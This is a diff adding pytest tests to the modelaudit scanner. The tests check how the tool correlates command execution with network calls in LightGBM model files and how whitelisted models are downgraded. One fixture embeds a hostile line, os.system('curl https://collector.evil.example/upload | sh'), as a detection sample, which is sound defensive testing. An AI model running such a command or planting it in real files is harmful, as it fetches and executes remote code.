@@ -6,6 +6,7 @@ from pathlib import Path
 
 import pytest
 
+from modelaudit.analysis.unified_context import UnifiedMLContext
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.models import ModelAuditResultModel
 from modelaudit.scanners import get_scanner_for_file
@@ -182,6 +183,63 @@ def test_scan_detects_command_and_network_correlation(tmp_path: Path) -> None:
     assert len(correlation_checks) == 1
     assert correlation_checks[0].status == CheckStatus.FAILED
     assert correlation_checks[0].severity == IssueSeverity.CRITICAL
+    assert correlation_checks[0].details["same_fragment_correlation"] is True
+
+
+def test_whitelisted_lightgbm_preserves_same_line_correlation(tmp_path: Path) -> None:
+    from modelaudit.whitelists import POPULAR_MODELS
+
+    path = tmp_path / "same_line.model"
+    path.write_text(
+        _build_lightgbm_text(["metadata=os.system('curl https://collector.evil.example/upload | sh')"]),
+        encoding="utf-8",
+    )
+    scanner = LightGBMScanner()
+    scanner.context = UnifiedMLContext(
+        file_path=path,
+        file_size=path.stat().st_size,
+        file_type=".model",
+        model_id=next(iter(POPULAR_MODELS)),
+        model_source="huggingface",
+    )
+
+    result = scanner.scan(str(path))
+
+    correlation_check = _check_by_name(result, "Command/Network Correlation Check")[0]
+    assert correlation_check.severity == IssueSeverity.CRITICAL
+    assert correlation_check.details["same_fragment_correlation"] is True
+    assert correlation_check.details.get("whitelist_downgrade") is None
+
+
+def test_whitelisted_lightgbm_downgrades_cross_line_correlation(tmp_path: Path) -> None:
+    from modelaudit.whitelists import POPULAR_MODELS
+
+    path = tmp_path / "cross_line.model"
+    path.write_text(
+        _build_lightgbm_text(
+            [
+                "metadata=os.system('echo benchmark')",
+                "callback_url=https://collector.evil.example/upload",
+            ]
+        ),
+        encoding="utf-8",
+    )
+    scanner = LightGBMScanner()
+    scanner.context = UnifiedMLContext(
+        file_path=path,
+        file_size=path.stat().st_size,
+        file_type=".model",
+        model_id=next(iter(POPULAR_MODELS)),
+        model_source="huggingface",
+    )
+
+    result = scanner.scan(str(path))
+
+    correlation_check = _check_by_name(result, "Command/Network Correlation Check")[0]
+    assert correlation_check.status == CheckStatus.FAILED
+    assert correlation_check.severity == IssueSeverity.INFO
+    assert correlation_check.details["same_fragment_correlation"] is False
+    assert correlation_check.details["whitelist_downgrade"] is True
 
 
 def test_scan_bounded_lightgbm_window_is_inconclusive(tmp_path: Path) -> None:
